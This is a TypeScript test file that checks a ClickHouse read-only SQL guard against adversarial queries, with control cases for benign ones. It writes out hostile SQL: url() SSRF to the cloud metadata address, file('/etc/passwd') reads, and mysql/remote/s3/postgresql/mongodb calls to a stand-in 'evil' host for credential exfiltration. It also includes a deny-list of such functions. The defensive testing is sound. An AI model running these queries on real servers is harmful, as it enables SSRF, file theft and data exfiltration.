import assert from 'node:assert/strict';
import { test } from 'node:test';
import { guardReadOnlySql } from '../src/lib/warehouse-model.ts';

// ─── ADVERSARIAL (QA bug-hunt) ────────────────────────────────────────────────
// These tests assert the SECURE behaviour we WANT. They are RED against HEAD (7ea13b8) — the
// warehouse read-only guard (guardReadOnlySql) only checks the LEADING verb + a forbidden-TOKEN
// scan. It has no notion of ClickHouse's remote/local TABLE FUNCTIONS, which are perfectly valid
// inside a `SELECT` (a read verb) and carry NO forbidden token. So an operator-typed "read-only"
// query reaches:
//   - url('http://169.254.169.254/…')  → server-side SSRF to cloud metadata / internal hosts
//   - file('/etc/passwd', …)           → arbitrary server-side file read
//   - mysql()/postgresql()/mongodb()/s3()/remote() → SSRF + credential exfil to any host
//   - numbers(1e11) / a monstrous cross join → unbounded resource use (DoS)
// guardReadOnlySql is the single source of truth for "safe to run" (adapters/warehouse.ts:167),
// so this is the whole gate — there is no second check downstream.
//
// Ref: G-ADV-DATA-1 (docs/GAPS_BACKLOG.md, docs/adversarial/data.md).
// UNSKIP when the guard denies remote/local table functions (an allowlist of table sources, or a
// deny-list incl. url/file/mysql/postgresql/mongodb/s3/remote/remoteSecure/hdfs/jdbc/odbc/…).

test('ADVERSARIAL G-ADV-DATA-1: url() table function must be rejected (SSRF)', () => {
  const r = guardReadOnlySql(
    "SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'JSONEachRow')",
  );
  assert.equal(r.ok, false, 'url() SSRF must be blocked by the read-only guard');
});

test('ADVERSARIAL G-ADV-DATA-1: file() table function must be rejected (arbitrary file read)', () => {
  const r = guardReadOnlySql("SELECT * FROM file('/etc/passwd', 'LineAsString')");
  assert.equal(r.ok, false, 'file() server-side read must be blocked');
});

test('ADVERSARIAL G-ADV-DATA-1: mysql()/remote() table functions must be rejected (SSRF + cred exfil)', () => {
  assert.equal(
    guardReadOnlySql("SELECT * FROM mysql('evil:3306','db','t','user','pass')").ok,
    false,
    'mysql() to an arbitrary host must be blocked',
  );
  assert.equal(
    guardReadOnlySql("SELECT * FROM remote('evil:9000', system.one)").ok,
    false,
    'remote() to an arbitrary host must be blocked',
  );
});

test('ADVERSARIAL G-ADV-DATA-1: s3()/postgresql()/mongodb() table functions must be rejected', () => {
  assert.equal(
    guardReadOnlySql("SELECT * FROM s3('https://evil.s3.amazonaws.com/x','CSV')").ok,
    false,
    's3() exfil/SSRF must be blocked',
  );
  assert.equal(
    guardReadOnlySql("SELECT * FROM postgresql('evil:5432','db','t','u','p')").ok,
    false,
    'postgresql() to an arbitrary host must be blocked',
  );
  assert.equal(
    guardReadOnlySql("SELECT * FROM mongodb('evil:27017','db','coll','u','p','')").ok,
    false,
    'mongodb() to an arbitrary host must be blocked',
  );
});

test('ADVERSARIAL G-ADV-DATA-1: numbers()/generateRandom() DoS sources must be rejected', () => {
  assert.equal(guardReadOnlySql('SELECT * FROM numbers(100000000000)').ok, false);
  assert.equal(guardReadOnlySql("SELECT * FROM generateRandom('a UInt64', 1, 1e9)").ok, false);
});

test('ADVERSARIAL G-ADV-DATA-1: the deny-list is case-insensitive and tolerates whitespace before the paren', () => {
  assert.equal(guardReadOnlySql("SELECT * FROM URL ('http://169.254.169.254/')").ok, false);
  assert.equal(guardReadOnlySql("select * from FiLe ('/etc/passwd','LineAsString')").ok, false);
});

// A legitimate read that only touches real tables must still pass — the fix must not over-block.
test('control: a plain SELECT over a table still passes the guard', () => {
  assert.equal(guardReadOnlySql('SELECT id, amount FROM txns LIMIT 10').ok, true);
});

// A COLUMN merely NAMED like a table function (no call — no paren) must NOT be over-blocked, and
// ordinary scalar functions (count/sum/toString) must pass — the deny-list is call-position only.
test('control: a column named `url`/`file` and ordinary functions still pass (no over-block)', () => {
  assert.equal(guardReadOnlySql('SELECT url, file FROM events LIMIT 5').ok, true);
  assert.equal(
    guardReadOnlySql('SELECT count(*), sum(amount), toString(id) FROM txns').ok,
    true,
  );
});
